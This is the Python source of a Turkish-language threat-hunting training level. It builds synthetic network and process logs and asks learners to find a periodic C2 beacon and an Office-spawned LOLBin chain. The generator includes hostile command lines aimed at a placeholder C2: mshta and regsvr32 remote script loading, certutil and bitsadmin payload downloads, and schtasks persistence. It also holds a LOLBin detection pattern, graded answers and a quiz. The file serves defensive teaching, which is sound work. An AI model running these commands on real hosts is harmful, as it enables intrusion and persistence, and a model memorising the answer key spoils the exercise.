"""Cilt 7 · Bölüm 10 — Tehdit Avı: Alarm Beklemeden Aramak.

TAMAMEN SAVUNMACI: oyuncu, kurumun avcı analistidir. Gerçek zararlı, gerçek komuta sunucusu ya da gerçek
saldırı yükü yoktur; her şey kurgusal, dosya-tabanlı sahte veridir (dış IP'ler TEST-NET). İki dosya + bir liste:
- `baglantilar.csv`    : ağ bağlantı günlüğü (zaman,kaynak,hedef_ip,port,bayt)
- `surecler.csv`       : çalışan süreç kaydı (zaman,host,kullanici,surec,ust_surec,komut)
- `bilinen_ipler.txt`  : "bilinen-iyi" hedef IP listesi (taban çizgisi)

Gizli iz: bir makine sabit aralıklarla (periyodik) bilinmeyen bir IP'ye "beacon" (yoklama sinyali) atıyor;
aynı makinede bir Office belgesi sistem araçlarını (LOLBin) tetikleyip kalıcılık kurmuş.
Gürültü: bilinen hizmetlere trafik, düzenli ama meşru zaman eşitleme (NTP), çok bağlanan ama DÜZENSİZ bir hedef,
tek seferlik rastgele siteler, meşru ama nadir süreçler (yönetici betikleri, yazdırma yardımcısı).

Determinizm: `uret` ağır veriyi sözlüğe gömmez; `_alt` alt-tohumunu saklar (`_tohum` motor tarafından ezilir).
`av_verisi` genel üreteçtir; `hy.olay_masasi.olay_avi` de kullanır.
"""
from __future__ import annotations

import random
from datetime import timedelta
from functools import lru_cache
from pathlib import Path

from hy.motor.kontrol import IP, Metin, Sayi, Secmeli
from hy.motor.seviye import Adim, Gorev, Seviye
from hy.ortak import uretec as u
from hy.seviyeler.c07_savunma.ortak import sec_doldur, sh

# ----------------------------------------------------------------------------- ortak üreteç

OFISLER = ["winword.exe", "excel.exe"]
LOL_ZINCIR = [("mshta.exe", "certutil.exe"), ("regsvr32.exe", "bitsadmin.exe"), ("wscript.exe", "certutil.exe"),
              ("rundll32.exe", "bitsadmin.exe"), ("powershell.exe", "certutil.exe")]
IMPL = ["onedrive_guncelle", "yazici_surucu", "ofis_yardimci", "tarayici_hizlandir", "pdf_bilesen"]
GOREV = ["MicrosoftEdgeGuncelleme", "AdobeSenkron", "YaziciOnbellek", "OneDriveDenetim", "SistemSaglik"]
RARE_PORT = [8443, 4443, 8080, 2083, 995]
NORMAL_SURECLER = [
    ("chrome.exe", "explorer.exe"), ("msedge.exe", "explorer.exe"), ("outlook.exe", "explorer.exe"),
    ("teams.exe", "explorer.exe"), ("excel.exe", "explorer.exe"), ("winword.exe", "explorer.exe"),
    ("onedrive.exe", "explorer.exe"), ("acrobat.exe", "explorer.exe"), ("zoom.exe", "explorer.exe"),
    ("notepad.exe", "explorer.exe"), ("calc.exe", "explorer.exe"), ("svchost.exe", "services.exe"),
    ("chrome.exe", "chrome.exe"), ("acrobat.exe", "outlook.exe"), ("excel.exe", "outlook.exe"),
    ("winword.exe", "outlook.exe"),
]
B_BASLIK = "zaman,kaynak,hedef_ip,port,bayt"
S_BASLIK = "zaman,host,kullanici,surec,ust_surec,komut"
SAAT = 6 * 3600          # av penceresi: 08:00 - 14:00


def _lol1_komut(l1: str, c2: str, kul: str, impl: str) -> str:
    return {
        "mshta.exe": f"mshta.exe http://{c2}/belge.hta",
        "regsvr32.exe": f"regsvr32.exe /s /n /u /i:http://{c2}/g.sct scrobj.dll",
        "wscript.exe": f"wscript.exe C:\\Users\\{kul}\\AppData\\Local\\Temp\\fatura_ozet.js",
        "rundll32.exe": f"rundll32.exe C:\\Users\\Public\\{impl}.dll Calistir",
        "powershell.exe": "powershell.exe -nop -w hidden -enc [KURGUSAL_KISALTILDI]",
    }[l1]


def _lol2_komut(l2: str, c2: str, impl: str) -> str:
    if l2 == "certutil.exe":
        return f"certutil.exe -urlcache -f http://{c2}/u.dat C:\\Users\\Public\\{impl}.exe"
    return f"bitsadmin.exe /transfer j /download /priority low http://{c2}/u.dat C:\\Users\\Public\\{impl}.exe"


def _hhmmss(t) -> str:
    return f"{t:%Y-%m-%d %H:%M:%S}"


def av_verisi(rng: random.Random, zor: bool) -> dict:
    """Bir av vakasının bütün verisi + cevapları. `zor`: jitter'lı beacon ve 443 portu (alışılmış port)."""
    D = u.gun(rng)
    bas = D + timedelta(hours=8)
    son = bas + timedelta(seconds=SAAT)
    hostlar = u.benzersiz(rng, lambda r: f"PC-{r.choice(u.DEPARTMANLAR).upper()}-{r.randint(1, 40):02d}", 11)
    kuls = u.isimler(rng, 11)
    kul = dict(zip(hostlar, kuls))
    srv = "SRV-DOSYA-01"
    ipler = u.benzersiz(rng, u.dis_ip, 36)
    bilinen, oneoff = ipler[:8], ipler[8:33]
    decoy_ip, c2, ntp_ip = ipler[33], ipler[34], bilinen[6]
    bilinen_port = {bilinen[0]: 443, bilinen[1]: 443, bilinen[2]: 443, bilinen[3]: 80, bilinen[4]: 80,
                    bilinen[5]: 53, bilinen[6]: 123, bilinen[7]: 443}
    host = hostlar[0]                       # enfekte makine (sıralama tohumdan gelen rastgele isimlerle zaten karışık)
    decoy_host = hostlar[1]
    it_host = hostlar[2]
    rng.shuffle(hostlar)

    # ---- bağlantı günlüğü
    rows = []
    for h in hostlar:
        for _ in range(rng.randint(18, 34)):
            ip = rng.choice([x for x in bilinen if x != ntp_ip])
            rows.append((bas + timedelta(seconds=rng.randint(0, SAAT - 1)), h, ip, bilinen_port[ip],
                         rng.randint(400, 120000)))
    ntp_p = rng.choice([900, 1800, 3600])
    t = bas + timedelta(seconds=rng.randint(0, 600))
    while t < son:
        rows.append((t, srv, ntp_ip, 123, 76))
        t += timedelta(seconds=ntp_p)
    for ip in oneoff:
        for _ in range(rng.randint(1, 3)):
            rows.append((bas + timedelta(seconds=rng.randint(0, SAAT - 1)), rng.choice(hostlar), ip,
                         rng.choice([443, 80]), rng.randint(2000, 400000)))
    decoy_n = rng.randint(18, 40)
    for _ in range(decoy_n):
        rows.append((bas + timedelta(seconds=rng.randint(0, SAAT - 1)), decoy_host, decoy_ip, 443,
                     rng.randint(3000, 90000)))

    # ---- beacon
    P = rng.choice([120, 180, 300, 600])
    jit = rng.randint(3, 3) if zor else rng.randint(0, 2)
    port = 443 if zor else rng.choice(RARE_PORT)
    l1, l2 = rng.choice(LOL_ZINCIR)
    ofis = rng.choice(OFISLER)
    impl, gorev = rng.choice(IMPL), rng.choice(GOREV)
    k = kul[host]
    t_belge = bas + timedelta(seconds=rng.randint(10 * 60, 85 * 60))
    t_lol1 = t_belge + timedelta(seconds=rng.randint(40, 120))
    t_indir = t_lol1 + timedelta(seconds=rng.randint(4, 9))
    t_calis = t_indir + timedelta(seconds=rng.randint(5, 12))
    t_beacon = t_calis + timedelta(seconds=rng.randint(8, 20))
    if rng.random() < 0.5:
        t_kalici = t_calis + timedelta(seconds=rng.randint(3, 6))
    else:
        t_kalici = t_beacon + timedelta(seconds=rng.randint(25, 70))
    n_beacon, i = 0, 0
    while True:
        tt = t_beacon + timedelta(seconds=i * P + (rng.randint(-jit, jit) if i else 0))
        if tt >= son:
            break
        rows.append((tt, host, c2, port, rng.randint(180, 260)))
        n_beacon += 1
        i += 1
    rows.sort(key=lambda r: (r[0], r[1]))

    # ---- süreç günlüğü
    srows = []

    def ekle(t_, h, s_, ust, komut):
        srows.append((t_, h, kul[h], s_, ust, komut))

    for h in hostlar:
        for _ in range(rng.randint(24, 40)):
            s_, ust = rng.choice(NORMAL_SURECLER)
            if h == host and s_ == ofis:
                continue
            ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), h, s_, ust,
                 f"C:\\Program Files\\Uygulamalar\\{s_}")
    for _ in range(rng.randint(3, 5)):                         # meşru: yazdırma yardımcısı Office'in çocuğudur
        h = rng.choice([x for x in hostlar if x != host])
        ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), h, "splwow64.exe", rng.choice(OFISLER),
             "C:\\Windows\\splwow64.exe")
    for _ in range(2):                                         # meşru: yönetici betiği
        ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), it_host, "powershell.exe", "explorer.exe",
             "powershell.exe -File C:\\Betikler\\yedek_kontrol.ps1")
    ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), it_host, "certutil.exe", "explorer.exe",
         "certutil.exe -hashfile C:\\Iso\\arac.iso SHA256")
    ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), it_host, "schtasks.exe", "explorer.exe",
         "schtasks.exe /query")
    ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), it_host, "yedek_araci.exe", "explorer.exe",
         "C:\\Program Files\\Yedek\\yedek_araci.exe")
    for _ in range(3):
        ekle(bas + timedelta(seconds=rng.randint(0, SAAT - 1)), rng.choice(hostlar), "rundll32.exe",
             "explorer.exe", "rundll32.exe shell32.dll")
    ekle(t_belge, host, ofis, "explorer.exe", f"C:\\Program Files\\Uygulamalar\\{ofis}")
    ekle(t_lol1, host, l1, ofis, _lol1_komut(l1, c2, k, impl))
    ekle(t_indir, host, l2, l1, _lol2_komut(l2, c2, impl))
    ekle(t_calis, host, impl + ".exe", l1, f"C:\\Users\\Public\\{impl}.exe")
    ekle(t_kalici, host, "schtasks.exe", impl + ".exe",
         f"schtasks.exe /create /tn {gorev} /tr C:\\Users\\Public\\{impl}.exe /sc minute /mo 10")
    srows.sort(key=lambda r: (r[0], r[1]))

    zamanlar = {"belge": t_belge, "lolbin": t_lol1, "indir": t_indir, "calis": t_calis, "beacon": t_beacon,
                "kalici": t_kalici}
    return {"b_rows": rows, "s_rows": srows, "bilinen": bilinen, "host": host, "kullanici": k, "c2": c2,
            "port": port, "periyot": P, "n_beacon": n_beacon, "lolbin1": l1, "lolbin2": l2, "ofis": ofis,
            "impl": impl, "gorev": gorev, "decoy_ip": decoy_ip, "decoy_host": decoy_host, "decoy_n": decoy_n,
            "ntp_ip": ntp_ip, "ntp_p": ntp_p, "ntp_host": srv, "it_host": it_host, "zamanlar": zamanlar,
            "sira_kalici_once": t_kalici < t_beacon}


def baglanti_metni(rows: list) -> str:
    return B_BASLIK + "\n" + "".join(f"{_hhmmss(r[0])},{r[1]},{r[2]},{r[3]},{r[4]}\n" for r in rows)


def surec_metni(rows: list) -> str:
    return S_BASLIK + "\n" + "".join(f"{_hhmmss(r[0])},{r[1]},{r[2]},{r[3]},{r[4]},{r[5]}\n" for r in rows)


def av_yaz(klasor: Path, v: dict) -> None:
    u.yaz(klasor / "baglantilar.csv", baglanti_metni(v["b_rows"]))
    u.yaz(klasor / "surecler.csv", surec_metni(v["s_rows"]))
    u.yaz(klasor / "bilinen_ipler.txt", "".join(f"{ip}\n" for ip in v["bilinen"]))


# Test çözücüsü için ortak betikler (beacon adayı: bilinen olmayan, ≥10 bağlantı, aralıkları neredeyse eşit)
AWK_BEACON = ("awk -F'[, :]' 'NR==FNR{ok[$1];next} FNR>1 && !($6 in ok){k=$5\" \"$6\" \"$7; "
              "t=$2*3600+$3*60+$4; if(k in l){d=t-l[k]; if(!(k in mn)||d<mn[k])mn[k]=d; if(d>mx[k])mx[k]=d; "
              "s[k]+=d; n[k]++} l[k]=t; c[k]++} "
              "END{for(k in n) if(n[k]>=10 && mx[k]-mn[k]<=20) printf \"%s %d %d\\n\", k, s[k]/n[k]+0.5, c[k]}'")


def beacon_cozumu(bilinen: str, baglanti: str, lab: Path) -> list:
    """[host, ip, port, periyot, sayi] — tek aday beklenir."""
    c = sh(f"{AWK_BEACON} {bilinen} {baglanti} | head -1", lab).split()
    return c if len(c) == 5 else ["", "", "", "", ""]


def surec_cozumu(surec: str, host: str, lab: Path) -> str:
    return sh(f"awk -F, -v h='{host}' '$2==h && ($5==\"winword.exe\"||$5==\"excel.exe\") && "
              f"$4!=\"splwow64.exe\" {{print $4}}' {surec} | head -1", lab)


# ----------------------------------------------------------------------------- vaka

SENARYOLAR = [
    {"musteri": "Mavi Tekne Turizm", "sektor": "otelcilik ve turizm", "kisi": "Güvenlik müdürü Aylin Hanım",
     "klasor": "av_kayitlari",
     "hikaye": "Hiçbir alarm çalmadı, kimse şikâyet etmedi. Ama yönetim kurulu 'rakip firmaların başına gelen "
               "sessiz sızmalar bizde de olabilir mi?' diye soruyor.",
     "hipotez": "ağdaki bir makine, saat gibi düzenli aralıklarla dışarıdaki bir sunucuya yoklama sinyali (beacon) atıyor"},
    {"musteri": "Anadolu Gıda Dağıtım", "sektor": "gıda ve dağıtım", "kisi": "Bilgi işlem müdürü Cenk Bey",
     "klasor": "ag_ve_surec",
     "hikaye": "Sektördeki bir rakip firma, sızmayı haftalar sonra dışarıdan gelen bir uyarıyla öğrendi. "
               "Cenk Bey 'biz alarm gelmesini beklemeyelim, kendimiz arayalım' diyor.",
     "hipotez": "bir Office belgesi açıldıktan sonra sistem araçları normal olmayan biçimde kullanıldı ve ardından dışarıyla düzenli bir konuşma başladı"},
    {"musteri": "Bora Hukuk Bürosu", "sektor": "hukuk", "kisi": "Ofis yöneticisi Selma Hanım",
     "klasor": "kayit_arsivi",
     "hikaye": "Büro, müvekkil dosyalarını tutuyor. Siber sigorta şirketi 'uç noktalarınızda gizli bir yerleşik "
               "olup olmadığını kanıtlayın' diye istedi; elde yalnızca iki kayıt dosyası var.",
     "hipotez": "gizli bir yerleşik tehdit hem nadir bir süreç zinciriyle iz bırakmış hem de dışarıya düzenli yoklama atıyor"},
]


@lru_cache(maxsize=32)
def _akis(alt: int) -> dict:
    rng = random.Random(alt)
    sen = rng.choice(SENARYOLAR)
    v = av_verisi(rng, zor=False)
    v["sen"] = sen
    return v


def _saat_metni(sn: int) -> str:
    return {900: "15 dakikada bir", 1800: "yarım saatte bir", 3600: "saatte bir"}[sn]


def uret(rng):
    alt = rng.randint(10_000_000, 999_999_999)
    v = _akis(alt)
    sen = v["sen"]
    return {
        "vaka": f"{sen['musteri']} ({sen['sektor']}) — alarmsız tehdit avı",
        "metin": {"musteri": sen["musteri"], "sektor": sen["sektor"], "kisi": sen["kisi"], "hikaye": sen["hikaye"],
                  "hipotez": sen["hipotez"], "klasor": sen["klasor"], "ntp_ip": v["ntp_ip"],
                  "ntp_donem": _saat_metni(v["ntp_p"]), "ntp_host": v["ntp_host"]},
        "cevaplar": {"c2": v["c2"], "periyot": v["periyot"], "sayi": v["n_beacon"], "port": v["port"],
                     "makine": v["host"], "surec": v["lolbin1"]},
        "_alt": alt,
    }


def yaz(lab: Path, s: dict) -> None:
    v = _akis(s["_alt"])
    av_yaz(lab / v["sen"]["klasor"], v)
    u.yaz(lab / "OKUBENI.txt",
          f"{v['sen']['musteri']} av kayıtları ({v['sen']['klasor']}/). KURGUSAL.\n"
          "baglantilar.csv   : ağ bağlantı günlüğü (zaman,kaynak,hedef_ip,port,bayt)\n"
          "surecler.csv      : süreç kaydı (zaman,host,kullanici,surec,ust_surec,komut)\n"
          "bilinen_ipler.txt : bilinen-iyi hedef IP'ler (taban çizgisi)\n")


# ----------------------------------------------------------------------------- kontroller

def _ip_hata(g, beklenen, b):
    v = _akis(b.senaryo["_alt"])
    if g == v["decoy_ip"]:
        return ("Bu hedefe çok bağlanılıyor ama aralıklar rastgele: insan davranışı. Beacon'ın imzası SAYI değil, "
                "bağlantılar arası sürenin hep AYNI olmasıdır.")
    if g == v["ntp_ip"]:
        return "Bu hedef düzenli ama bilinen_ipler.txt içinde: meşru zaman eşitleme. Bilinen-iyiyi eledikten sonra ara."
    return None


def _periyot_hata(g, beklenen, b):
    v = _akis(b.senaryo["_alt"])
    try:
        n = int(g)
    except ValueError:
        return None
    if n == v["ntp_p"]:
        return "Bu, zaman eşitleme hizmetinin (meşru) aralığı. Bilinmeyen hedefin aralığını ölç."
    if n == v["n_beacon"]:
        return "Bu bağlantı SAYISI. İstenen, iki bağlantı arasındaki süre (saniye)."
    return None


def _sayi_hata(g, beklenen, b):
    v = _akis(b.senaryo["_alt"])
    try:
        n = int(g)
    except ValueError:
        return None
    if n == v["decoy_n"]:
        return "Bu, düzensiz bağlanan başka bir hedefin sayısı. Beacon'ın hedefine (önceki görevdeki IP) bakmalısın."
    if n == v["periyot"]:
        return "Bu aralık (saniye). Burada kaç KEZ bağlandığı isteniyor."
    return None


def _port_hata(g, beklenen, b):
    if g in ("443", "80", "53", "123"):
        return "Bu, sıradan bir hizmet portu. Beacon'ın IP'sine giden satırlarda `port` sütununu oku."
    return None


def _makine_hata(g, beklenen, b):
    v = _akis(b.senaryo["_alt"])
    if g == norm_(v["decoy_host"]):
        return "Bu makine çok bağlanıyor ama düzensiz, beacon atmıyor. Beacon'ın IP'sine bağlanan `kaynak`ı ara."
    if g == norm_(v["ntp_host"]):
        return "Bu sunucu yalnızca zaman eşitliyor (bilinen-iyi). Beacon'ın IP'sine giden `kaynak` aranıyor."
    if g == norm_(v["it_host"]):
        return "Bu makinede yönetici betikleri çalışıyor ama dışarıya beacon yok."
    return None


def norm_(s: str) -> str:
    return s.casefold()


def _surec_hata(g, beklenen, b):
    v = _akis(b.senaryo["_alt"])
    if g in ("splwow64", "splwow64.exe"):
        return "Yazdırma yardımcısı Office'in meşru çocuğudur (birkaç makinede var). Tek bir ŞÜPHELİ başlatılan var."
    if g in (v["lolbin2"], v["lolbin2"][:-4]):
        return "Bu ikinci halka: onu başlatan zaten şüpheli bir süreç. Office'in DOĞRUDAN başlattığını ara."
    if g in ("powershell", "explorer", "explorer.exe", v["ofis"], v["ofis"][:-4]):
        return "Office'in kendisi değil, onun doğurduğu beklenmedik çocuk süreç aranıyor (`ust_surec` sütunu)."
    return None


def coz(lab: Path, s: dict) -> dict:
    k = s["metin"]["klasor"]
    bil, bag, sur = f"{k}/bilinen_ipler.txt", f"{k}/baglantilar.csv", f"{k}/surecler.csv"
    host, ip, port, per, sayi = beacon_cozumu(bil, bag, lab)
    surec = surec_cozumu(sur, host, lab)
    return sec_doldur({1: ip, 2: per, 3: sayi, 4: port, 5: host, 6: surec}, GOREVLER, lab, s)


# ----------------------------------------------------------------------------- adımlar

ADIMLAR = [
    Adim("Alarm yok: avcı gibi düşün", """
Şimdiye kadar hep **alarm** geldi, sen baktın. **Tehdit avı** (threat hunting) tersidir: kimse alarm vermedi,
sen kendin bir **hipotezle** (sınanabilir tahmin) kayıtlara girip gizli tehdidi ararsın. Bu vakada hipotezimiz:
**<<hipotez>>.**

Yöntem üç adım: (1) hipotez kur, (2) veride o hipotezin bırakacağı izi ara, (3) bulduğunu ikinci bir kaynakla
doğrula. Veri <<musteri>> (<<sektor>>) için kurgusal. <<kisi>> bize üç dosya verdi:
""", komut="ls <<klasor>>"),
    Adim("Ağ günlüğü: baglantilar.csv", """
`baglantilar.csv` her dış bağlantıyı yazar: zaman, **kaynak** (makine), **hedef_ip**, **port** ve **bayt**
(gönderilen veri). İlk satırlara bak:
""", komut="head -n 5 <<klasor>>/baglantilar.csv", sonra="""
Binlerce satır var ve hepsi "normal" görünüyor. Gizli tehdit gürültünün içinde. İlk iş, **bilinen-iyiyi** (taban
çizgisini) ayırıp elemek: `bilinen_ipler.txt` kurumun tanıdığı hizmetleri listeler.
"""),
    Adim("Bilinen-iyiyi ele: grep -vwFf", """
`grep -v` eşleşenleri **atar**, `-F` desenleri düz metin sayar, `-w` tam kelime eşleşmesi ister (192.0.2.5,
192.0.2.50'yi yakalamasın), `-f` desenleri bir dosyadan okur. Bilinen IP'lere giden satırlar elenince kalan satır sayısı:
""", komut="grep -vwFf <<klasor>>/bilinen_ipler.txt <<klasor>>/baglantilar.csv | wc -l", sonra="""
Bilinen-iyiyi eleyince geriye **alışılmamış** hedefler kalır. Av böyle ilerler: önce "normal" tanımlanır, sonra
normal dışı aranır. Ama kalan hâlâ kalabalık: tek seferlik rastgele siteler de var.
"""),
    Adim("Hedef bazında say: cut, sort, uniq -c", """
Kalan satırlarda hangi hedefe kaç kez gidilmiş? `cut` hedef sütununu alır, `sort | uniq -c` sayar, `sort -rn`
çoktan aza dizer:
""", komut="grep -vwFf <<klasor>>/bilinen_ipler.txt <<klasor>>/baglantilar.csv | cut -d, -f3 | sort | uniq -c | sort -rn | head -5",
         sonra="""
Üstte birkaç hedef çıkar. **Çok bağlanmak tek başına kanıt değil**: bir kullanıcı canlı skor sayfasını da
yüzlerce kez açabilir. Beacon'ın asıl imzası **düzen**: aralık hep aynı. Sıradaki adım bunu ölçmek.
"""),
    Adim("Düzen ölç: bağlantılar arası süre", """
Önce **zararsız bir örnek**: `<<ntp_host>>` sunucusu <<ntp_donem>> `<<ntp_ip>>` adresine bağlanıyor (zaman
eşitleme, meşru). Zamanı saniyeye çevirip ardışık satırların farkını alalım. `-F'[, :]'` satırı virgül, boşluk
ve iki noktadan böler; `$2` saat, `$3` dakika, `$4` saniyedir. Farkları `sort | uniq -c` ile sayarsan "kaç kez hangi
aralık" çıkar:
""", komut="grep -w <<ntp_ip>> <<klasor>>/baglantilar.csv | awk -F'[, :]' '{t=$2*3600+$3*60+$4; if (p) print t-p; p=t}' | sort | uniq -c",
         sonra="""
Tek satır: hep **aynı** aralık. Makine gibi düzenli, ama bu hedef bilinen-iyi listesinde olduğu için zararsız.
Aynı ölçümü **listede olmayan** şüpheli hedefe uyguladığında da tek bir aralık görürsen (jitter denen küçük
oynamalar 1-3 saniye sapma yaratabilir), o bir beacon'dır. Görevlerde bunu sen yapacaksın.
"""),
    Adim("Süreç günlüğü: nadir olanı bul", """
Ağ tarafı "kim, nereye" dedi. Şimdi ikinci kaynak: `surecler.csv`. Hangi süreçler **nadir** çalışmış?
`cut` süreç adı sütununu alır, `uniq -c` sayar, `sort -n` azdan çoğa dizer:
""", komut="cut -d, -f4 <<klasor>>/surecler.csv | sort | uniq -c | sort -n | head -8", sonra="""
Nadir olan her şey kötü değil: yönetici betikleri ve bakım araçları da nadirdir. **Bağlam** belirler: kim
başlattı, hangi komut satırıyla? `ust_surec` (parent, yani onu doğuran süreç) sütunu en değerli ipucudur.
"""),
    Adim("Anne-çocuk ilişkisi: normal nasıl görünür", """
Normalde Outlook'un çocukları bellidir: ek açtığın PDF, Excel, Word gibi. Bakalım `outlook.exe` neleri doğurmuş:
""", komut="awk -F, '$5==\"outlook.exe\" {print $4}' <<klasor>>/surecler.csv | sort | uniq -c", sonra="""
Liste kısa ve anlaşılır. Av kuralı: **normal anne-çocuk listesini bil, dışına çıkanı yakala.** Örneğin Word ya da
Excel'in kendi başına bir sistem aracı (yazdırma yardımcısı hariç) başlatması çok şüphelidir.
"""),
    Adim("LOLBin: sistemin kendi araçlarıyla saldırı", """
**LOLBin** (Living Off the Land Binary, "araziden geçinen" ikili): Windows'ta zaten bulunan meşru araçların
(`certutil`, `bitsadmin`, `mshta`, `regsvr32`, `rundll32`, `wscript`, `powershell`) kötüye kullanılması. Saldırgan
kendi zararlısını getirmek yerine bunları kullanır, çünkü antivirüsler onlara güvenir. Günlükte bu araçlardan kaç
süreç başlamış?
""", komut="cut -d, -f4 <<klasor>>/surecler.csv | grep -c -E 'certutil|bitsadmin|mshta|regsvr32|rundll32|wscript|powershell'",
         sonra="""
Bu araçlar çoğu zaman **meşrudur**: yönetici betikleri de powershell kullanır. Bu yüzden listeye bakıp "kötü" demek
yanlıştır; anne süreç ve komut satırı belirler. Office'in doğurduğu bir `mshta` ya da internetten dosya indiren bir
`certutil` anlamlıdır. **Hacker gözüyle:** LOLBin, imza tabanlı savunmayı atlatır; savunmacının cevabı
davranışı (anne-çocuk, komut satırı, zamanlama) taban çizgisiyle karşılaştırmaktır. Şimdi görevlere geç.
"""),
]

GOREVLER = [
    Gorev("`<<klasor>>/baglantilar.csv` içinde **beacon** atan hedef IP hangisi? (Bilinen-iyi listesinde OLMAYAN, "
          "aynı makineden hep aynı aralıkla bağlanılan hedef; çok bağlanılan ama düzensiz hedefler beacon değildir.)",
          IP("c2", sik_hatalar=_ip_hata),
          ("Önce bilinen-iyi hedefleri ele, sonra kalanlarda 'çok bağlanan' değil 'saat gibi düzenli bağlanan' hedefi ara.",
           "`grep -vwFf bilinen_ipler.txt baglantilar.csv | cut -d, -f3 | sort | uniq -c | sort -rn` adayları verir; her adayı "
           "`grep <ip> baglantilar.csv | awk -F'[, :]' '{t=$2*3600+$3*60+$4; if (p) print t-p; p=t}' | sort | uniq -c` ile ölç.",
           "Adaylardan birinde aralık çıktısı tek satıra yakın (aynı sayı ± 1-2 saniye), diğerlerinde onlarca farklı sayı var."),
          puan=40, baslik="Beacon hedefi"),
    Gorev("Bu beacon'ın **periyodu** kaç saniye? (İki ardışık bağlantı arasındaki süre. Küçük oynamalar varsa en sık "
          "görülen değeri yaz.)",
          Sayi("periyot", tolerans=1, sik_hatalar=_periyot_hata),
          ("Hedefi belirledin; şimdi o hedefe giden satırların zamanlarına bak ve farklarını al.",
           "Zaman farklarını saniye cinsinden `awk` ile çıkar, `sort | uniq -c` ile say: en sık değer periyottur.",
           "`grep <ip> baglantilar.csv | awk -F'[, :]' '{t=$2*3600+$3*60+$4; if (p) print t-p; p=t}' | sort | uniq -c | sort -rn | head`"),
          puan=40, baslik="Beacon periyodu"),
    Gorev("Bu beacon hedefine toplam **kaç kez** bağlanılmış? (Başlık satırı sayılmaz.)",
          Sayi("sayi", sik_hatalar=_sayi_hata),
          ("Yalnızca beacon IP'sini içeren satırları say.",
           "`grep` ile IP'yi süz, `wc -l` ile say. IP bir başkasının parçası olabilir: `-w` kullan.",
           "`grep -w <ip> baglantilar.csv | wc -l`"),
          puan=40, baslik="Bağlantı sayısı"),
    Gorev("Beacon hangi **porta** bağlanıyor? (Sıradan 80, 443, 53, 123 dışında bir port olabilir.)",
          Sayi("port", sik_hatalar=_port_hata),
          ("Beacon IP'sine giden satırların `port` sütunu hep aynı mı?",
           "`grep -w <ip> baglantilar.csv | cut -d, -f4 | sort | uniq -c`",
           "Çıktıda tek bir port numarası görürsün; onu yaz."),
          puan=40, baslik="Beacon portu"),
    Gorev("Bu beacon hangi **makineden** (`kaynak`) atılıyor? Makine adını yaz (örn. `PC-...`).",
          Metin("makine", sik_hatalar=_makine_hata, bicim="makine adı (PC-...)"),
          ("Beacon IP'sine giden satırların `kaynak` sütununa bak.",
           "`grep -w <ip> baglantilar.csv | cut -d, -f2 | sort | uniq -c`",
           "Tek bir makine çıkmalı. Çıkmıyorsa yanlış IP'ye bakıyorsun (düzensiz hedef ya da bilinen-iyi)."),
          puan=40, baslik="Enfekte makine"),
    Gorev("İkinci kaynaktan doğrula: `surecler.csv`'de bu makinede, bir **Office uygulaması** (`winword.exe` ya da "
          "`excel.exe`) tarafından başlatılmış ve **meşru olmayan** sistem aracı hangisi? (Yazdırma yardımcısı "
          "meşrudur. Süreç adını yaz.)",
          Metin("surec", sik_hatalar=_surec_hata, son_ekleri_at=(".exe",), bicim="süreç adı (örn. xyz.exe)"),
          ("Makinenin satırlarında `ust_surec` sütunu Office olan, ama normal olmayan çocuğu ara.",
           "`grep ',<makine>,' surecler.csv | awk -F, '$5==\"winword.exe\" || $5==\"excel.exe\" {print $4}' | sort | uniq -c`.",
           "Çıkan iki-üç süreçten biri yazdırma yardımcısıdır (splwow64); LOLBin olanı yaz."),
          puan=40, baslik="LOLBin zincirinin başı"),
    Gorev("Avın sonucu: ağ günlüğündeki düzenli beacon ile süreç günlüğündeki 'Office → sistem aracı' zinciri aynı "
          "makinede çıktı. Bu **nasıl yorumlanır** ve sıradaki adım ne olmalı?",
          Secmeli([
              ("Güçlü bulgu: beacon deseni, makinedeki süreç zinciriyle eşleşiyor; iki bağımsız kaynak aynı hikâyeyi "
               "anlatıyor. Makine izole edilip kanıtlar toplanır",
               "Doğru. Tek kaynak yanılabilir; iki bağımsız iz (ağ + süreç) aynı makinede örtüşünce bulgu güçlenir. "
               "Sıradaki adım: makineyi ağdan ayırmak, belleği/dosyaları adli olarak saklamak, sonra olay müdahalesine geçmek."),
              ("Kesin bir şey söylenemez çünkü hiçbir alarm üretmedi; alarm yoksa tehdit de yoktur, bu yüzden kayıtları "
               "kapatıp beklemek en doğrusudur",
               "Yanlış. Tehdit avının varlık nedeni tam da alarmsız tehdittir: gelişmiş saldırganlar alarm üretmemek için "
               "tasarlanır. Alarm yokluğu temizlik kanıtı değildir."),
              ("Yalnızca düzenli aralık yeterli bir kanıttır; süreç kaydına bakmaya gerek yok, hedef IP'yi engelleyip "
               "makineye hiç dokunmadan avı kapatmak yeterlidir",
               "Yanlış. IP engeli saldırganın bir dakikada taşıyabileceği bir önlemdir; yerleşik hâlâ makinede. "
               "Ayrıca düzenli trafik tek başına kanıt değil (meşru NTP da düzenlidir); ikinci kaynakla doğrulamak gerekir."),
              ("Düzenli aralıklı trafik her zaman otomatik güncellemedir; hedef IP'yi bilinen-iyi listesine ekleyip "
               "taban çizgisini güncelleyerek avı bitirmek en kolay yoldur",
               "Yanlış. Bir şeyi bilinen-iyiye eklemek için kanıt gerekir. Burada üstelik Office'ten doğan LOLBin zinciri var; "
               "bu hedefi listeye eklemek saldırganı kalıcı olarak 'meşru' yapar."),
          ], dogru=0),
          ("Tek bir iz mi var, yoksa birbirinden bağımsız iki kaynak aynı şeyi mi söylüyor?",
           "Güçlü bulgu = örtüşen bağımsız kanıtlar. Ardından saldırganın ilerlemesini durdurmak ve kanıtı bozmamak gerekir.",
           "Doğru şık, iki izin örtüştüğünü söyler ve makineyi izole edip kanıt toplamayı önerir."),
          puan=40, baslik="Avın sonucu"),
]


def _kapanis():
    return """
Bu vakada hiçbir alarm çalmadı; tehdit, sıradan trafiğin arasında **saat gibi düzenli** bir bağlantı ve Office'in
doğurduğu **beklenmedik bir sistem aracı** olarak yaşıyordu. Av döngüsü şöyle işledi: hipotez (düzenli yoklama olabilir),
veri (bilinen-iyiyi ele, kalanlarda aralığı ölç), doğrulama (aynı makinenin süreç zinciri). Savunma dersi: normali
tanımla ki sapma görünsün; tek bir ize değil, örtüşen izlere güven; bulduğun deseni kalıcı algılamaya (kural/alarm)
